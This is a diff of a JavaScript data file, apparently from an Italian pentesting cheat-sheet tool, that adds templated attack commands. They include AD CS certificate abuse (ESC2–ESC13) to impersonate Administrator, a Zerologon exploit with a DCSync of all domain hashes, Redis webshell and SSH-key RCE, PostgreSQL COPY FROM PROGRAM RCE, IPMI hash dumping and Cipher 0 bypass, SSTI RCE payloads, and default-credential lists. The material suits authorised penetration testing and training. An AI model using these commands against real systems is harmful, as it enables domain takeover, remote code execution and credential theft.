+      "esc9",
+      "esc10",
+      "esc13"
     ],
-    "template": "certipy template -u '<user>@<domain>' -p '<password>' -dc-ip <ip> -template <template> -save-old",
+    "template": "certipy-ad template -u '<user>@<domain>' -p '<password>' -dc-ip <ip> -template <template> -save-old",
     "params": [
       {
         "key": "user",
@@ -10530,20 +10677,66 @@ const COMMANDS = [
         "key": "id",
         "label": "Request ID",
         "placeholder": "12"
+      },
+      {
+        "key": "target",
+        "label": "Account vittima (ESC9/10)",
+        "placeholder": "svc_victim"
+      },
+      {
+        "key": "newpass",
+        "label": "Nuova password vittima",
+        "placeholder": "NewP@ss123!"
       }
     ],
     "variants": [
       {
         "id": "default",
         "label": "ESC4 (write template)",
-        "template": "certipy template -u '<user>@<domain>' -p '<password>' -dc-ip <ip> -template <template> -save-old\ncertipy template -u '<user>@<domain>' -p '<password>' -dc-ip <ip> -template <template>\ncertipy req -u '<user>@<domain>' -p '<password>' -dc-ip <ip> -ca <ca> -template <template> -upn Administrator@<domain>\n# RIPRISTINA il template originale\ncertipy template -u '<user>@<domain>' -p '<password>' -dc-ip <ip> -template <template> -configuration <template>.json",
+        "template": "certipy-ad template -u '<user>@<domain>' -p '<password>' -dc-ip <ip> -template <template> -save-old\ncertipy-ad template -u '<user>@<domain>' -p '<password>' -dc-ip <ip> -template <template>\ncertipy-ad req -u '<user>@<domain>' -p '<password>' -dc-ip <ip> -ca <ca> -template <template> -upn Administrator@<domain>\n# RIPRISTINA il template originale\ncertipy-ad template -u '<user>@<domain>' -p '<password>' -dc-ip <ip> -template <template> -configuration <template>.json",
         "description": "Salvi la config, riscrivi il template come ESC1, richiedi il cert come Administrator, poi ripristini l'originale."
       },
       {
         "id": "esc7",
         "label": "ESC7 (Manage CA)",
-        "template": "certipy ca -u '<user>@<domain>' -p '<password>' -dc-ip <ip> -ca <ca> -add-officer <user>\ncertipy ca -u '<user>@<domain>' -p '<password>' -dc-ip <ip> -ca <ca> -enable-template SubCA\ncertipy req -u '<user>@<domain>' -p '<password>' -dc-ip <ip> -ca <ca> -template SubCA -upn Administrator@<domain>\ncertipy ca -u '<user>@<domain>' -p '<password>' -dc-ip <ip> -ca <ca> -issue-request <id>\ncertipy req -u '<user>@<domain>' -p '<password>' -dc-ip <ip> -ca <ca> -retrieve <id>",
+        "template": "certipy-ad ca -u '<user>@<domain>' -p '<password>' -dc-ip <ip> -ca <ca> -add-officer <user>\ncertipy-ad ca -u '<user>@<domain>' -p '<password>' -dc-ip <ip> -ca <ca> -enable-template SubCA\ncertipy-ad req -u '<user>@<domain>' -p '<password>' -dc-ip <ip> -ca <ca> -template SubCA -upn Administrator@<domain>\ncertipy-ad ca -u '<user>@<domain>' -p '<password>' -dc-ip <ip> -ca <ca> -issue-request <id>\ncertipy-ad req -u '<user>@<domain>' -p '<password>' -dc-ip <ip> -ca <ca> -retrieve <id>",
         "description": "Aggiunge l'account come Officer, abilita SubCA, invia la richiesta che resta in pending, la emette sfruttando il ruolo di Officer e infine recupera il certificato."
+      },
+      {
+        "id": "esc2",
+        "label": "ESC2 (Any Purpose)",
+        "template": "certipy-ad req -u '<user>@<domain>' -p '<password>' -dc-ip <ip> -ca <ca> -template <template> -upn administrator@<domain>\ncertipy-ad auth -pfx administrator.pfx -dc-ip <ip>",
+        "description": "Template con EKU «Any Purpose» o senza EKU: il certificato vale per qualunque scopo, Client Authentication compresa. Si richiede come in ESC1 mettendo l'UPN di Administrator nel SAN."
+      },
+      {
+        "id": "esc3",
+        "label": "ESC3 (Enrollment Agent)",
+        "template": "# 1. richiedi il certificato Enrollment Agent\ncertipy-ad req -u '<user>@<domain>' -p '<password>' -dc-ip <ip> -ca <ca> -template <template>\n# 2. usa quel cert per emetterne uno «per conto di» Administrator sul template User\ncertipy-ad req -u '<user>@<domain>' -p '<password>' -dc-ip <ip> -ca <ca> -template User -on-behalf-of '<domain>\\administrator' -pfx <user>.pfx\ncertipy-ad auth -pfx administrator.pfx -dc-ip <ip>",
+        "description": "Il template ha l'EKU Certificate Request Agent. Si ottiene prima un cert da Enrollment Agent, poi lo si usa per richiedere un certificato on-behalf-of Administrator su un template di enrollment normale."
+      },
+      {
+        "id": "esc6",
+        "label": "ESC6 (CA flag SAN)",
+        "template": "certipy-ad req -u '<user>@<domain>' -p '<password>' -dc-ip <ip> -ca <ca> -template User -upn administrator@<domain>\ncertipy-ad auth -pfx administrator.pfx -dc-ip <ip>",
+        "description": "La CA ha il flag EDITF_ATTRIBUTESUBJECTALTNAME2 attivo: accetta un SAN arbitrario su qualsiasi template con autenticazione, anche uno standard come User. Stesso effetto di ESC1 senza bisogno di un template vulnerabile."
+      },
+      {
+        "id": "esc9",
+        "label": "ESC9 (no security extension)",
+        "template": "# serve GenericWrite/ForceChangePassword sul <target> + template senza msDS-SecurityExtension\n# 1. imposta l'UPN della vittima al valore 'administrator' (senza @dominio)\ncertipy-ad account update -u '<user>@<domain>' -p '<password>' -user <target> -upn administrator -dc-ip <ip>\n# 2. richiedi il cert come la vittima\ncertipy-ad req -u '<target>@<domain>' -p '<newpass>' -ca <ca> -template <template> -dc-ip <ip>\n# 3. ripristina l'UPN originale, poi autentica\ncertipy-ad account update -u '<user>@<domain>' -p '<password>' -user <target> -upn '<target>@<domain>' -dc-ip <ip>\ncertipy-ad auth -pfx administrator.pfx -domain <domain> -dc-ip <ip>",
+        "description": "Template senza Security Extension: il certificato viene mappato per UPN e non per SID. Si cambia temporaneamente l'UPN della vittima in `administrator`, si emette il cert a suo nome e all'auth il DC lo mappa sull'Administrator reale. Ripristinare sempre l'UPN."
+      },
+      {
+        "id": "esc10",
+        "label": "ESC10 (weak cert mapping)",
+        "template": "# DC con StrongCertificateBinding in Compatibility/Disabled (mapping debole)\n# stesso flusso di ESC9: cambia UPN della vittima, richiedi il cert, ripristina, autentica\ncertipy-ad account update -u '<user>@<domain>' -p '<password>' -user <target> -upn administrator -dc-ip <ip>\ncertipy-ad req -u '<target>@<domain>' -p '<newpass>' -ca <ca> -template <template> -dc-ip <ip>\ncertipy-ad account update -u '<user>@<domain>' -p '<password>' -user <target> -upn '<target>@<domain>' -dc-ip <ip>\ncertipy-ad auth -pfx administrator.pfx -domain <domain> -dc-ip <ip>",
+        "description": "Mappatura certificato debole lato DC (chiave CertificateMappingMethods o binding non forzato). Si sfrutta come ESC9 manipolando l'UPN della vittima: utile quando il template non è ESC9 ma il DC accetta comunque il mapping debole."
+      },
+      {
+        "id": "esc13",
+        "label": "ESC13 (issuance policy → gruppo)",
+        "template": "# template con issuance policy il cui OID è legato a un gruppo privilegiato (msDS-OIDToGroupLink)\ncertipy-ad req -u '<user>@<domain>' -p '<password>' -dc-ip <ip> -ca <ca> -template <template>\ncertipy-ad auth -pfx <user>.pfx -dc-ip <ip>",
+        "description": "Il template ha una issuance policy con OID collegato a un gruppo (msDS-OIDToGroupLink). Il TGT ottenuto col certificato eredita la SID di quel gruppo: si diventa membro effettivo di un gruppo privilegiato senza modificarne l'appartenenza."
       }
     ]
   },
@@ -10589,6 +10782,67 @@ const COMMANDS = [
         "label": "Scheduled task",
         "template": ".\\SharpGPOAbuse.exe --AddComputerTask --TaskName \"Update\" --Author <user> --Command \"cmd.exe\" --Arguments \"/c <cmd>\" --GPOName \"<gpo>\"",
         "description": "Esegue un comando come SYSTEM sulle macchine nello scope."
+      }
+    ]
+  },
+  {
+    "id": "zerologon",
+    "name": "Zerologon (CVE-2020-1472)",
+    "category": "active-directory",
+    "subcategory": "priv-esc",
+    "group": "CVE",
+    "description": "Sfrutta un difetto crittografico di Netlogon: con circa 2000 tentativi si azzera la password dell'account macchina del domain controller, senza alcuna credenziale. Con l'account macchina a password vuota si fa poi il DCSync del krbtgt e di tutto il dominio.",
+    "note": "# Ripristino OBBLIGATORIO\nAzzerare la password del DC lo scollega dal dominio e può romperlo. Dopo aver estratto gli hash, recupera la password originale del DC$ dal registro (usando l'Administrator ottenuto) e ripristinala con `restorepassword.py`. In un lab usa-e-getta si può saltare, in un assessment reale MAI.",
+    "platform": "linux",
+    "requires": [
+      "no-creds"
+    ],
+    "protocols": [
+      "rpc"
+    ],
+    "tags": [
+      "zerologon",
+      "cve-2020-1472",
+      "netlogon"
+    ],
+    "template": "python3 zerologon_tester.py <dchost> <ip>",
+    "params": [
+      {
+        "key": "dchost",
+        "label": "DC hostname",
+        "placeholder": "DC01"
+      },
+      {
+        "key": "ip",
+        "label": "DC IP",
+        "ctx": "ip",
+        "placeholder": "10.10.10.11"
+      },
+      {
+        "key": "domain",
+        "label": "Domain",
+        "ctx": "domain",
+        "placeholder": "corp.local"
+      }
+    ],
+    "variants": [
+      {
+        "id": "scan",
+        "label": "Check (tester)",
+        "template": "python3 zerologon_tester.py <dchost> <ip>",
+        "description": "Verifica se il DC è vulnerabile senza modificarlo: `Success! DC is vulnerable` = attaccabile, `Attack failed after 2000 attempts` = patchato."
+      },
+      {
+        "id": "default",
+        "label": "Exploit + DCSync",
+        "template": "python3 set_empty_pw.py <dchost> <ip>\nsecretsdump.py '<domain>/<dchost>$@<ip>' -no-pass -just-dc",
+        "description": "Azzera la password del DC$ e con l'account macchina vuoto fa il DCSync di tutti gli hash, krbtgt compreso. Subito dopo va ripristinata la password (vedi nota)."
+      },
+      {
+        "id": "nxc",
+        "label": "Check (netexec)",
+        "template": "nxc smb <ip> -u '' -p '' -M zerologon",
+        "description": "Stesso check tramite modulo netexec, senza credenziali: comodo se non hai i tool di dirkjanm sottomano."
       }
     ]
   },
@@ -11025,7 +11279,8 @@ const COMMANDS = [
     "platform": "linux",
     "requires": [
       "password",
-      "hash"
+      "hash",
+      "ticket"
     ],
     "protocols": [
       "rpc",
@@ -12025,6 +12280,1559 @@ const COMMANDS = [
         "label": "Login + cookie",
         "template": "curl -s -c cookies.txt -d 'user=admin&pass=admin' http://<ip>/login; curl -s -b cookies.txt http://<ip>/dashboard",
         "description": "`-c` salva il cookie di sessione, `-b` lo riusa."
+      }
+    ]
+  },
+  {
+    "id": "redis-enum",
+    "name": "redis-cli — enum Redis",
+    "category": "service-enum",
+    "subcategory": "redis",
+    "group": "Enumeration",
+    "description": "Si connette al server Redis e ne legge stato e contenuto. Se risponde senza chiedere una password l'istanza è aperta: da lì `KEYS *` elenca tutte le chiavi e `GET` ne legge il valore, spesso token di sessione, credenziali o config lasciate in cache.",
+    "note": "# Credenziali di default\nRedis di default non ha autenticazione. Se risponde `NOAUTH`, prova i `requirepass` deboli: `foobared` (default storico) · `redis` · `password` · `admin`.",
+    "platform": "cross-platform",
+    "requires": [
+      "no-creds"
+    ],
+    "protocols": [
+      "redis"
+    ],
+    "tags": [
+      "redis",
+      "redis-cli",
+      "enum"
+    ],
+    "template": "redis-cli -h <ip> INFO server",
+    "params": [
+      {
+        "key": "ip",
+        "label": "IP",
+        "ctx": "ip",
+        "placeholder": "10.10.10.11"
+      },
+      {
+        "key": "key",
+        "label": "Chiave",
+        "placeholder": "session:1"
+      },
+      {
+        "key": "password",
+        "label": "Password",
+        "ctx": "password",
+        "placeholder": "P@ssw0rd"
+      }
+    ],
+    "variants": [
+      {
+        "id": "default",
+        "label": "INFO / connect",
+        "template": "redis-cli -h <ip> INFO server",
+        "description": "Legge versione e ruolo del server. Una risposta senza errore di auth conferma che l'istanza è raggiungibile e non protetta."
+      },
+      {
+        "id": "keys",
+        "label": "Chiavi & valori",
+        "template": "redis-cli -h <ip> KEYS '*'\nredis-cli -h <ip> GET <key>",
+        "description": "Elenca tutte le chiavi e ne legge una. Cerca sessioni, credenziali applicative e configurazioni salvate in cache."
+      },
+      {
+        "id": "auth",
+        "label": "Con password",
+        "template": "redis-cli -h <ip> -a '<password>' INFO",
+        "description": "Autentica quando `requirepass` è impostato. Le password deboli o di default come `foobared` sono comuni."
+      }
+    ],
+    "refs": [
+      {
+        "label": "HackTricks — 6379 Redis",
+        "url": "https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis"
+      }
+    ]
+  },
+  {
+    "id": "redis-rce",
+    "name": "Redis — RCE via CONFIG SET",
+    "category": "service-enum",
+    "subcategory": "redis",
+    "group": "Exploitation",
+    "description": "Se Redis è aperto e il processo può scrivere sul filesystem, `CONFIG SET dir` più `dbfilename` reindirizzano il file di dump dove serve: si scrive una webshell nel web root o una chiave pubblica in `authorized_keys` per una shell SSH. Il salvataggio effettivo avviene con `SAVE`.",
+    "platform": "linux",
+    "requires": [
+      "no-creds"
+    ],
+    "protocols": [
+      "redis"
+    ],
+    "tags": [
+      "redis",
+      "rce",
+      "webshell"
+    ],
+    "template": "redis-cli -h <ip> config set dir /var/www/html\nredis-cli -h <ip> config set dbfilename shell.php\nredis-cli -h <ip> set x '<?php system($_GET[\"c\"]); ?>'\nredis-cli -h <ip> save",
+    "params": [
+      {
+        "key": "ip",
+        "label": "IP",
+        "ctx": "ip",
+        "placeholder": "10.10.10.11"
+      }
+    ],
+    "variants": [
+      {
+        "id": "webshell",
+        "label": "Webshell (web root)",
+        "template": "redis-cli -h <ip> config set dir /var/www/html\nredis-cli -h <ip> config set dbfilename shell.php\nredis-cli -h <ip> set x '<?php system($_GET[\"c\"]); ?>'\nredis-cli -h <ip> save",
+        "description": "Scrive `shell.php` nel web root: la RCE parte da `http://<ip>/shell.php?c=id`. Serve conoscere un path servito da un web server e scrivibile dal processo redis."
+      },
+      {
+        "id": "sshkey",
+        "label": "Chiave SSH",
+        "template": "ssh-keygen -t rsa -f ./key -q -N ''\n(echo; cat key.pub; echo) > key.txt\nredis-cli -h <ip> flushall\ncat key.txt | redis-cli -h <ip> -x set sshkey\nredis-cli -h <ip> config set dir /root/.ssh\nredis-cli -h <ip> config set dbfilename authorized_keys\nredis-cli -h <ip> save\nssh -i key root@<ip>",
+        "description": "Scrive la propria chiave pubblica in `/root/.ssh/authorized_keys` (o nella home di un altro utente) per una shell SSH. Funziona se il processo redis gira come quell'utente e la dir esiste."
+      }
+    ]
+  },
+  {
+    "id": "psql-login",
+    "name": "psql — login & enum PostgreSQL",
+    "category": "service-enum",
+    "subcategory": "postgresql",
+    "group": "Connection",
+    "description": "Apre una sessione PostgreSQL e ne enumera database e ruoli. Le credenziali di default `postgres:postgres` (o `postgres` senza password) sono frequenti. `\\l` elenca i database, `\\du` i ruoli: cerca un ruolo con attributo Superuser, che apre la strada a lettura file e RCE.",
+    "note": "# Credenziali di default\n`postgres:postgres` · `postgres:` (vuota) · `postgres:password` · `postgres:admin` · `admin:admin`.",
+    "platform": "cross-platform",
+    "requires": [
+      "password"
+    ],
+    "protocols": [
+      "postgresql"
+    ],
+    "tags": [
+      "postgres",
+      "psql",
+      "enum"
+    ],
+    "template": "PGPASSWORD='<password>' psql -h <ip> -U <user> -d postgres",
+    "params": [
+      {
+        "key": "ip",
+        "label": "IP",
+        "ctx": "ip",
+        "placeholder": "10.10.10.11"
+      },
+      {
+        "key": "user",
+        "label": "User",
+        "ctx": "user",
+        "placeholder": "jdoe"
+      },
+      {
+        "key": "password",
+        "label": "Password",
+        "ctx": "password",
+        "placeholder": "P@ssw0rd"
+      }
+    ],
+    "variants": [
+      {
+        "id": "default",
+        "label": "Login",
+        "template": "PGPASSWORD='<password>' psql -h <ip> -U <user> -d postgres",
+        "description": "Sessione interattiva. Se entra, prosegui con `\\l` e `\\du`."
+      },
+      {
+        "id": "enum",
+        "label": "Database & ruoli",
+        "template": "PGPASSWORD='<password>' psql -h <ip> -U <user> -d postgres -c '\\l'\nPGPASSWORD='<password>' psql -h <ip> -U <user> -d postgres -c '\\du'",
+        "description": "Elenca database e ruoli in modo non interattivo. Un ruolo `Superuser` = lettura file e RCE possibili."
+      },
+      {
+        "id": "defcreds",
+        "label": "Default creds",
+        "template": "psql -h <ip> -U postgres -d postgres",
+        "description": "Prova l'accesso con l'utente `postgres` senza password: misconfigurazione comune."
+      }
+    ],
+    "refs": [
+      {
+        "label": "HackTricks — 5432 PostgreSQL",
+        "url": "https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql"
+      }
+    ]
+  },
+  {
+    "id": "psql-rce",
+    "name": "PostgreSQL — RCE & lettura file",
+    "category": "service-enum",
+    "subcategory": "postgresql",
+    "group": "Exploitation",
+    "description": "Con un ruolo Superuser, PostgreSQL esegue comandi di sistema tramite `COPY ... FROM PROGRAM` (dalla 9.3) e legge file arbitrari copiandoli in una tabella. L'output del comando finisce in una tabella temporanea che poi si interroga.",
+    "platform": "linux",
+    "requires": [
+      "password"
+    ],
+    "protocols": [
+      "postgresql"
+    ],
+    "tags": [
+      "postgres",
+      "rce",
+      "readfile"
+    ],
+    "template": "PGPASSWORD='<password>' psql -h <ip> -U <user> -d postgres -c \"DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(o text); COPY cmd_exec FROM PROGRAM 'id'; SELECT * FROM cmd_exec;\"",
+    "params": [
+      {
+        "key": "ip",
+        "label": "IP",
+        "ctx": "ip",
+        "placeholder": "10.10.10.11"
+      },
+      {
+        "key": "user",
+        "label": "User",
+        "ctx": "user",
+        "placeholder": "jdoe"
+      },
+      {
+        "key": "password",
+        "label": "Password",
+        "ctx": "password",
+        "placeholder": "P@ssw0rd"
+      }
+    ],
+    "variants": [
+      {
+        "id": "cmdexec",
+        "label": "RCE (COPY FROM PROGRAM)",
+        "template": "PGPASSWORD='<password>' psql -h <ip> -U <user> -d postgres -c \"DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(o text); COPY cmd_exec FROM PROGRAM 'id'; SELECT * FROM cmd_exec;\"",
+        "description": "Esegue `id` come utente del servizio PostgreSQL. Sostituisci `id` con una reverse shell per una shell interattiva. Richiede privilegi Superuser."
+      },
+      {
+        "id": "readfile",
+        "label": "Lettura file",
+        "template": "PGPASSWORD='<password>' psql -h <ip> -U <user> -d postgres -c \"CREATE TABLE f(t text); COPY f FROM '/etc/passwd'; SELECT * FROM f;\"",
+        "description": "Copia un file di sistema in una tabella e lo stampa. Utile per leggere chiavi, config e hash con i diritti del servizio."
+      }
+    ]
+  },
+  {
+    "id": "mongo-enum",
+    "name": "mongosh — enum MongoDB",
+    "category": "service-enum",
+    "subcategory": "mongodb",
+    "group": "Enumeration",
+    "description": "Si connette a MongoDB, che è spesso esposto senza autenticazione, ed elenca database e collezioni per poi dumpare i documenti. I dati sono in chiaro e contengono di frequente utenti, hash e token applicativi. Con installazioni vecchie il client si chiama `mongo` invece di `mongosh`.",
+    "note": "# Credenziali di default\nDi norma nessuna autenticazione. Se attiva: `admin:admin` · `root:root` · `mongo:mongo`. Prova anche il database `admin` con `--authenticationDatabase admin`.",
+    "platform": "cross-platform",
+    "requires": [
+      "no-creds"
+    ],
+    "protocols": [
+      "mongodb"
+    ],
+    "tags": [
+      "mongodb",
+      "mongosh",
+      "nosql"
+    ],
+    "template": "mongosh --host <ip> --quiet --eval 'db.adminCommand({listDatabases:1})'",
+    "params": [
+      {
+        "key": "ip",
+        "label": "IP",
+        "ctx": "ip",
+        "placeholder": "10.10.10.11"
+      },
+      {
+        "key": "db",
+        "label": "Database",
+        "placeholder": "app"
+      },
+      {
+        "key": "coll",
+        "label": "Collezione",
+        "placeholder": "users"
+      }
+    ],
+    "variants": [
+      {
+        "id": "default",
+        "label": "Database",
+        "template": "mongosh --host <ip> --quiet --eval 'db.adminCommand({listDatabases:1})'",
+        "description": "Elenca i database senza auth. Una risposta valida conferma l'esposizione anonima."
+      },
+      {
+        "id": "collections",
+        "label": "Collezioni & dump",
+        "template": "mongosh --host <ip>/<db> --quiet --eval 'db.getCollectionNames()'\nmongosh --host <ip>/<db> --quiet --eval 'db.<coll>.find().pretty()'",
+        "description": "Elenca le collezioni di un database e dumpa i documenti di una di esse. Cerca la collezione `users` per credenziali."
+      }
+    ]
+  },
+  {
+    "id": "elastic-enum",
+    "name": "Elasticsearch — enum HTTP",
+    "category": "service-enum",
+    "subcategory": "elastic",
+    "group": "Enumeration",
+    "description": "Elasticsearch espone tutto via API REST su HTTP. `_cat/indices` elenca gli indici con il numero di documenti, poi `_search` ne dumpa il contenuto. Un 200 senza credenziali significa istanza aperta: gli indici contengono spesso log e dati applicativi sensibili.",
+    "note": "# Credenziali di default\nCon security/x-pack attivo: `elastic:changeme` (default storico) · `elastic:elastic` · `kibana:changeme`. Spesso comunque esposto senza auth.",
+    "platform": "cross-platform",
+    "requires": [
+      "no-creds"
+    ],
+    "protocols": [
+      "elastic",
+      "http"
+    ],
+    "tags": [
+      "elasticsearch",
+      "elastic",
+      "http"
+    ],
+    "template": "curl -s 'http://<ip>:9200/_cat/indices?v'",
+    "params": [
+      {
+        "key": "ip",
+        "label": "IP",
+        "ctx": "ip",
+        "placeholder": "10.10.10.11"
+      },
+      {
+        "key": "index",
+        "label": "Indice",
+        "placeholder": "users"
+      }
+    ],
+    "variants": [
+      {
+        "id": "default",
+        "label": "Indici",
+        "template": "curl -s 'http://<ip>:9200/_cat/indices?v'",
+        "description": "Elenca gli indici. La colonna `docs.count` dice quanti documenti contiene ciascuno."
+      },
+      {
+        "id": "search",
+        "label": "Dump indice",
+        "template": "curl -s 'http://<ip>:9200/<index>/_search?pretty&size=100'",
+        "description": "Dumpa i primi 100 documenti di un indice. Alza `size` per estrarne di più."
+      },
+      {
+        "id": "health",
+        "label": "Cluster & versione",
+        "template": "curl -s 'http://<ip>:9200/'\ncurl -s 'http://<ip>:9200/_cluster/health?pretty'",
+        "description": "Legge versione (per cercare CVE, es. RCE su vecchie release) e stato del cluster."
+      }
+    ]
+  },
+  {
+    "id": "memcached-enum",
+    "name": "Memcached — dump cache",
+    "category": "service-enum",
+    "subcategory": "memcached",
+    "group": "Enumeration",
+    "description": "Memcached parla un protocollo testuale su TCP 11211 senza autenticazione. `stats` dà una panoramica, `stats items` più `cachedump` elencano le chiavi memorizzate e `get` ne legge il valore. I valori in cache contengono a volte sessioni utente o credenziali.",
+    "platform": "cross-platform",
+    "requires": [
+      "no-creds"
+    ],
+    "protocols": [
+      "memcached"
+    ],
+    "tags": [
+      "memcached",
+      "cache",
+      "enum"
+    ],
+    "template": "memcstat --servers=<ip>",
+    "params": [
+      {
+        "key": "ip",
+        "label": "IP",
+        "ctx": "ip",
+        "placeholder": "10.10.10.11"
+      },
+      {
+        "key": "slab",
+        "label": "Slab ID",
+        "placeholder": "1"
+      },
+      {
+        "key": "key",
+        "label": "Chiave",
+        "placeholder": "session"
+      }
+    ],
+    "variants": [
+      {
+        "id": "stats",
+        "label": "Stats",
+        "template": "memcstat --servers=<ip>\n# oppure senza libmemcached:\necho -e 'stats\\r' | nc -q1 <ip> 11211",
+        "description": "Panoramica del server: numero di elementi in cache e uptime. Conferma che risponde senza auth."
+      },
+      {
+        "id": "keys",
+        "label": "Chiavi & valori",
+        "template": "echo -e 'stats items\\r' | nc -q1 <ip> 11211\necho -e 'stats cachedump <slab> 100\\r' | nc -q1 <ip> 11211\necho -e 'get <key>\\r' | nc -q1 <ip> 11211",
+        "description": "Elenca gli slab, ne dumpa le chiavi e legge un valore. Cerca chiavi con nomi tipo `session` o `user`."
+      }
+    ]
+  },
+  {
+    "id": "ipmi-dumphash",
+    "name": "IPMI — dump & crack hash",
+    "category": "service-enum",
+    "subcategory": "ipmi",
+    "group": "Exploitation",
+    "description": "IPMI 2.0 ha una falla di progetto nel protocollo RAKP: il BMC restituisce un hash della password di qualsiasi utente valido prima dell'autenticazione, quindi si estrae offline. Alcuni BMC accettano anche Cipher 0, che bypassa del tutto l'autenticazione. Gli hash si crackano con hashcat mode 7300.",
+    "note": "# Credenziali di default\nDefault dei BMC per la Cipher 0 / login web: `ADMIN:ADMIN` (Supermicro) · `root:calvin` (Dell iDRAC) · `USERID:PASSW0RD` (IBM/Lenovo, con lo zero) · `Administrator:admin` (HP iLO) · `admin:admin` · `root:root`.",
+    "platform": "linux",
+    "requires": [
+      "no-creds"
+    ],
+    "protocols": [
+      "ipmi"
+    ],
+    "tags": [
+      "ipmi",
+      "bmc",
+      "rakp"
+    ],
+    "template": "msfconsole -q -x \"use auxiliary/scanner/ipmi/ipmi_dumphashes; set RHOSTS <ip>; run; exit\"",
+    "params": [
+      {
+        "key": "ip",
+        "label": "IP",
+        "ctx": "ip",
+        "placeholder": "10.10.10.11"
+      },
+      {
+        "key": "wordlist",
+        "label": "Wordlist",
+        "placeholder": "/usr/share/wordlists/rockyou.txt"
+      }
+    ],
+    "variants": [
+      {
+        "id": "msf",
+        "label": "Dump hash (Metasploit)",
+        "template": "msfconsole -q -x \"use auxiliary/scanner/ipmi/ipmi_dumphashes; set RHOSTS <ip>; run; exit\"",
+        "description": "Estrae gli hash RAKP degli utenti del BMC. Salva l'output in formato `user:hash` per hashcat."
+      },
+      {
+        "id": "crack",
+        "label": "Crack (hashcat 7300)",
+        "template": "hashcat -m 7300 ipmi.hash <wordlist>",
+        "description": "Cracka gli hash RAKP estratti. Le password di default dei BMC (es. `ADMIN`) cadono subito."
+      },
+      {
+        "id": "cipher0",
+        "label": "Cipher 0 (auth bypass)",
+        "template": "ipmitool -I lanplus -C 0 -H <ip> -U Administrator -P '' user list",
+        "description": "Con Cipher 0 alcuni BMC eseguono comandi con qualsiasi password. Se funziona, si possono creare utenti amministrativi."
+      }
+    ]
+  },
+  {
+    "id": "rsync-enum",
+    "name": "rsync — moduli & accesso",
+    "category": "service-enum",
+    "subcategory": "rsync",
+    "group": "Enumeration",
+    "description": "Il demone rsync sulla porta 873 espone dei moduli, cioè cartelle condivise. Senza autenticazione si elencano i moduli e, se sono aperti, si sfogliano e si scaricano i file. Un modulo scrivibile permette di piazzare una chiave SSH o un job cron sull'host.",
+    "platform": "linux",
+    "requires": [
+      "no-creds"
+    ],
+    "protocols": [
+      "rsync"
+    ],
+    "tags": [
+      "rsync",
+      "873",
+      "file-share"
+    ],
+    "template": "rsync -av --list-only rsync://<ip>/",
+    "params": [
+      {
+        "key": "ip",
+        "label": "IP",
+        "ctx": "ip",
+        "placeholder": "10.10.10.11"
+      },
+      {
+        "key": "module",
+        "label": "Modulo",
+        "placeholder": "share"
+      }
+    ],
+    "variants": [
+      {
+        "id": "default",
+        "label": "Lista moduli",
+        "template": "rsync -av --list-only rsync://<ip>/",
+        "description": "Elenca i moduli condivisi dal demone. Ognuno è un potenziale punto di lettura o scrittura."
+      },
+      {
+        "id": "browse",
+        "label": "Sfoglia modulo",
+        "template": "rsync -av --list-only rsync://<ip>/<module>/",
+        "description": "Lista i file dentro un modulo senza scaricarli, per capire cosa contiene."
+      },
+      {
+        "id": "download",
+        "label": "Scarica file",
+        "template": "rsync -av rsync://<ip>/<module>/ ./loot/",
+        "description": "Scarica ricorsivamente il contenuto del modulo in locale per il pillaging."
+      },
+      {
+        "id": "upload",
+        "label": "Carica (se scrivibile)",
+        "template": "rsync -av ./payload rsync://<ip>/<module>/",
+        "description": "Scrive un file nel modulo, se il demone lo consente: utile per una chiave SSH o un cron malevolo."
+      }
+    ]
+  },
+  {
+    "id": "ssti-detect",
+    "name": "SSTI — detection & engine",
+    "category": "vuln-analysis",
+    "subcategory": "web-app-testing",
+    "group": "SSTI",
+    "description": "Individua una Server-Side Template Injection e riconosce il motore. Si inietta prima un'espressione matematica come `{{7*7}}` o `${7*7}` in ogni campo riflesso: se compare `49` il template valuta l'input. Un polyglot unico prova più sintassi in un colpo, poi si distingue l'engine (Jinja2, Twig, Freemarker...) con payload che si comportano diversamente.",
+    "platform": "cross-platform",
+    "requires": [
+      "no-creds"
+    ],
+    "protocols": [
+      "http"
+    ],
+    "tags": [
+      "ssti",
+      "template-injection",
+      "web"
+    ],
+    "template": "curl -gs 'http://<ip>/?<param>=${{<%[%27%22}}%25\\'",
+    "params": [
+      {
+        "key": "ip",
+        "label": "IP",
+        "ctx": "ip",
+        "placeholder": "10.10.10.11"
+      },
+      {
+        "key": "param",
+        "label": "Parametro",
+        "placeholder": "name"
+      }
+    ],
+    "variants": [
+      {
+        "id": "detect",
+        "label": "Detection (polyglot)",
+        "template": "# incolla nel campo riflesso; se qualcosa va in errore o valuta, c'è SSTI\n${{<%[%'\"}}%\\",
+        "description": "Polyglot che rompe o valuta su Jinja2, Twig, Freemarker, Smarty e altri. Una risposta anomala (errore di template o output valutato) segnala il punto iniettabile."
+      },
+      {
+        "id": "math",
+        "label": "Math check",
+        "template": "# in ciascun campo, uno alla volta:\n{{7*7}}\n${7*7}\n<%= 7*7 %>\n#{7*7}",
+        "description": "Se la risposta contiene `49` il valore è stato valutato lato server. La sintassi che funziona restringe già il motore."
+      },
+      {
+        "id": "identify",
+        "label": "Identifica engine",
+        "template": "{{7*'7'}}   # Jinja2 => 7777777 | Twig => 49\n${7*7}      # Freemarker/Java\n*{7*7}      # Thymeleaf\n{system('id')} # Smarty",
+        "description": "Payload che distinguono i motori: `{{7*'7'}}` dà 7777777 in Jinja2 e 49 in Twig. Identificato il motore, scegli l'RCE giusta."
+      }
+    ],
+    "refs": [
+      {
+        "label": "PayloadsAllTheThings — SSTI",
+        "url": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection"
+      }
+    ]
+  },
+  {
+    "id": "ssti-rce",
+    "name": "SSTI — RCE per engine",
+    "category": "vuln-analysis",
+    "subcategory": "web-app-testing",
+    "group": "SSTI",
+    "description": "Una volta identificato il motore di template, il payload giusto esegue comandi di sistema con i privilegi del web server. Ogni engine ha la sua catena: Jinja2 risale ai globals di Python, Twig registra `system` come filtro, Freemarker usa la utility Execute. `tplmap` automatizza detection e sfruttamento quando il payload manuale non basta.",
+    "platform": "cross-platform",
+    "requires": [
+      "no-creds"
+    ],
+    "protocols": [
+      "http"
+    ],
+    "tags": [
+      "ssti",
+      "rce",
+      "web"
+    ],
+    "template": "{{ cycler.__init__.__globals__.os.popen('<cmd>').read() }}",
+    "params": [
+      {
+        "key": "ip",
